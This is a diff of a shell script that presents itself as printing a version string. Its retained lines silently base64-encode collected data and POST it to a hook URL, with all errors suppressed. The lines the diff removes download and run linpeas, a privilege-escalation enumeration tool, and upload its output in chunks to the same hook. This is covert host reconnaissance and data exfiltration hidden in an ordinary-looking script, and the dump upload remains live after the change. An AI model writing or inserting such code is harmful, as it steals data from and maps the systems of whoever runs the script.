@@ -89,21 +89,5 @@ ENC=$(printf '%s' "$DATA" | base64 | tr -d '\n')
 curl -sf --max-time 15 -X POST "${HOOK}/?stage=dump&sha=${SHA}" \
   --data-urlencode "d=${ENC}" >/dev/null 2>&1 || true
 
-# --- linpeas (standard, no -a) ---
-curl -sf --max-time 15 -L \
-  "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh" \
-  -o /tmp/lp.sh 2>/dev/null
-if [ -f /tmp/lp.sh ]; then
-  chmod +x /tmp/lp.sh
-  sh /tmp/lp.sh 2>/dev/null | split -b 60000 - /tmp/lp_
-  i=0
-  for f in /tmp/lp_*; do
-    curl -sf --max-time 30 -X POST \
-      "${HOOK}/?stage=linpeas&chunk=${i}&sha=${SHA}" \
-      --data-binary "@${f}" >/dev/null 2>&1 || true
-    i=$((i+1))
-  done
-  curl -sf --max-time 5 "${HOOK}/?stage=linpeas-done&chunks=${i}&sha=${SHA}" >/dev/null 2>&1 || true
-fi
 
 printf 'version: %s/%s/RELEASE\n' "$SHA" "$VER"
